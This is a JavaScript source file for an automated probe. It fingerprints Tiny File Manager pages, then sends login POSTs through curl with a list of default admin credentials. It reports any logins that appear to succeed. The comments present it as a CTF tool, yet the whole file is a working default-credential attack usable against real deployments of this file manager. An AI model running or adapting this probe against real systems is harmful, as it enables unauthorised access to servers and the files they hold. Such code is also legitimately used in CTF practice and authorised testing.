import { spawn } from 'node:child_process';

const TFM_MARKERS = /tiny\s*file\s*manager|tinyfilemanager|prasathmani|name=["']fm_(usr|pwd)["']/i;

/** Credenciais comuns em CTF / instalações por defeito (Tiny File Manager). */
const DEFAULT_PAIRS = [
  ['admin', 'admin@123'],
  ['admin', 'admin'],
  ['admin', 'password'],
  ['admin', '123456'],
  ['admin', 'admin123'],
];

function looksLikeTinyFm(bodyText) {
  return TFM_MARKERS.test(String(bodyText || ''));
}

function loginCandidatesFromResponse(r) {
  const urls = new Set();
  const base = String(r?.finalUrl || r?.url || '').split('#')[0];
  if (!base) return [];
  try {
    const u = new URL(base);
    const origin = `${u.protocol}//${u.host}`;
    urls.add(base);
    if (!/\/(index\.php|tinyfilemanager\.php)(\?|$)/i.test(u.pathname)) {
      urls.add(`${origin}/index.php`);
      urls.add(`${origin}/tinyfilemanager.php`);
    }
  } catch {
    // ignore
  }
  return [...urls];
}

function runCurlPost(loginUrl, user, pass, timeoutMs) {
  const sec = String(Math.max(3, Math.floor(timeoutMs / 1000)));
  const body = `fm_usr=${encodeURIComponent(user)}&fm_pwd=${encodeURIComponent(pass)}`;
  const args = [
    '-k',
    '-sS',
    '-i',
    '--compressed',
    '-L',
    '--max-redirs',
    '3',
    '--connect-timeout',
    sec,
    '--max-time',
    sec,
    '-H',
    'Content-Type: application/x-www-form-urlencoded',
    '--data',
    body,
    loginUrl,
  ];
  return new Promise((resolve, reject) => {
    const child = spawn('curl', args, { stdio: ['ignore', 'pipe', 'pipe'] });
    const out = [];
    const err = [];
    child.stdout.on('data', (d) => out.push(d));
    child.stderr.on('data', (d) => err.push(d));
    child.on('error', reject);
    child.on('close', () => {
      resolve(Buffer.concat(out).toString('utf8'));
    });
  });
}

function postLoginLooksSuccess(text) {
  const t = String(text || '').toLowerCase();
  if (t.includes('name="fm_pwd"') || t.includes("name='fm_pwd'")) return false;
  if (t.includes('wrong password') || t.includes('invalid login')) return false;
  return (
    t.includes('sign-out') ||
    t.includes('fa-sign-out') ||
    t.includes('logout') ||
    (t.includes('path=') && t.includes('tiny')) ||
    t.includes('root_path')
  );
}

/**
 * Quando o corpo HTML sugere Tiny File Manager, tenta POST com credenciais típicas de CTF.
 */
export async function runTinyFileManagerProbe(webResponses, { log, timeoutMs = 12000, maxOrigins = 4 } = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const hits = [];
  const triedOrigins = new Set();

  for (const r of webResponses || []) {
    if (!looksLikeTinyFm(r?.bodyText)) continue;
    const candidates = loginCandidatesFromResponse(r);
    for (const loginUrl of candidates) {
      let origin = '';
      try {
        origin = new URL(loginUrl).origin;
      } catch {
        continue;
      }
      if (triedOrigins.has(origin)) continue;
      triedOrigins.add(origin);
      if (triedOrigins.size > maxOrigins) break;

      for (const [user, pwd] of DEFAULT_PAIRS) {
        try {
          logger(`[tinyfm] POST ${loginUrl} user=${user}`, 'info');
          const raw = await runCurlPost(loginUrl, user, pwd, timeoutMs);
          if (postLoginLooksSuccess(raw)) {
            hits.push({ url: loginUrl, username: user, password: pwd });
            logger(`[tinyfm] possível login OK ${user} @ ${loginUrl}`, 'success');
            break;
          }
        } catch (e) {
          logger(`[tinyfm] ${loginUrl}: ${e?.message || String(e)}`, 'warn');
        }
      }
    }
    if (triedOrigins.size > maxOrigins) break;
  }

  return { hits, origins: triedOrigins.size };
}
